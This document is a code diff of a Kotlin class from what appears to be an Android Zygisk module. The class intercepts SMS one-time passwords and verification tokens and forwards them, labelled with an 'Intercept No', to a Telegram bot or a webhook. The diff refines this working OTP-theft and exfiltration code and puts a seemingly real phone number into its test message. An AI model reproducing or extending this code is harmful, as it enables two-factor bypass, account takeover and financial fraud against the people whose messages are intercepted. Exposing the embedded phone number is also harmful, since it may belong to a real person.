@@ -19,10 +19,10 @@ class TokenForwarder(private val configManager: ConfigManager) {
 
         if (botToken.isBlank() || chatId.isBlank()) {
             if (config.forwardUrl.isBlank()) return false
-            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp, config)
+            return forwardWebhook(config.forwardUrl, config.forwardMethod, otp)
         }
 
-        return forwardTelegram(botToken, chatId, otp, config)
+        return forwardTelegram(botToken, chatId, otp)
     }
 
     fun sendTestMessage(): Boolean {
@@ -31,35 +31,40 @@ class TokenForwarder(private val configManager: ConfigManager) {
         val chatId = config.telegramChatId
         if (botToken.isBlank() || chatId.isBlank()) return false
 
-        val senderId = SmsMatcher.savedSenderId(config) ?: "AD-YESPRO-S"
         val testOtp = LastOtp(
             otp = "TEST1234",
-            sender = senderId,
+            sender = "08977509618",
             body = "sZ/HWb9+LtFZSOaVeU9+baPVa9X4imd4wq4noAGAFKvKenId/qwYS8IYcuU8OP3XLllboZ/ARatoNaJtWdZ7g==",
-            phone = senderId,
-            messageLabel = "YESPAY NEXT"
+            phone = "08977509618",
+            messageLabel = "",
+            direction = "incoming"
         )
-        return forwardTelegram(botToken, chatId, testOtp, config)
+        return forwardTelegram(botToken, chatId, testOtp)
     }
 
-    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp, config: ModuleConfig): Boolean {
-        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp, config))
+    private fun forwardTelegram(botToken: String, chatId: String, otp: LastOtp): Boolean {
+        return postTelegram(botToken, chatId, buildZygiskMenuMessage(otp))
     }
 
-    fun buildZygiskMenuMessage(otp: LastOtp, config: ModuleConfig? = null): String {
-        val cfg = config ?: configManager.load()
-        val senderId = SmsMatcher.savedSenderId(cfg) ?: otp.sender.ifBlank { otp.phone }
-        val messageLabel = otp.messageLabel.ifBlank { formatSenderLabel(senderId) }
+    /** Sirf Intercept No + verify token + Zygisk Menu header */
+    fun buildZygiskMenuMessage(otp: LastOtp): String {
+        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender })
         val tokenBody = otp.body.ifBlank { otp.otp }
 
         return buildString {
-            appendLine("📱 <b>Hivirtus Zygisk Mode</b>")
+            appendLine("📱 <b>Zygisk Menu</b>")
             appendLine("<b>Mode By @hivirtus @liqdy</b>")
             appendLine("────────────────")
-            appendLine("📤 <b>Sender ID:</b> ${escapeHtml(senderId)}")
-            appendLine("💬 <b>App:</b> $messageLabel")
+            appendLine("📞 <b>Intercept No:</b> ${escapeHtml(interceptNo)}")
             append(escapeHtml(tokenBody))
         }
+    }
+
+    private fun formatInterceptNumber(raw: String): String {
+        val cleaned = raw.trim()
+        if (cleaned.isBlank()) return "Unknown"
+        val digits = cleaned.replace("\\D".toRegex(), "")
+        return if (digits.length >= 8) digits else cleaned
     }
 
     private fun escapeHtml(text: String): String {
@@ -67,18 +72,6 @@ class TokenForwarder(private val configManager: ConfigManager) {
             .replace("&", "&amp;")
             .replace("<", "&lt;")
             .replace(">", "&gt;")
-    }
-
-    private fun formatSenderLabel(sender: String): String {
-        var label = sender.trim()
-        listOf("AD-", "VM-", "JD-", "BP-", "TX-").forEach { prefix ->
-            if (label.startsWith(prefix, ignoreCase = true)) {
-                label = label.substring(prefix.length)
-            }
-        }
-        label = label.trim('-', ' ')
-        if (label.endsWith("-S", ignoreCase = true)) label = label.dropLast(2)
-        return label.uppercase().ifBlank { "INTERCEPT" }
     }
 
     private fun postTelegram(botToken: String, chatId: String, text: String): Boolean {
@@ -92,15 +85,14 @@ class TokenForwarder(private val configManager: ConfigManager) {
         return postJson(url, payload)
     }
 
-    private fun forwardWebhook(url: String, method: String, otp: LastOtp, config: ModuleConfig): Boolean {
-        val senderId = SmsMatcher.savedSenderId(config) ?: otp.sender
+    private fun forwardWebhook(url: String, method: String, otp: LastOtp): Boolean {
+        val interceptNo = formatInterceptNumber(otp.phone.ifBlank { otp.sender })
         val payload = JSONObject()
             .put("otp", otp.otp)
             .put("token", otp.body.ifBlank { otp.otp })
-            .put("sender_id", senderId)
-            .put("message_label", otp.messageLabel)
+            .put("intercept_no", interceptNo)
             .put("direction", otp.direction)
-            .put("telegram_format", buildZygiskMenuMessage(otp, config))
+            .put("telegram_format", buildZygiskMenuMessage(otp))
             .toString()
 
         val request = Request.Builder()
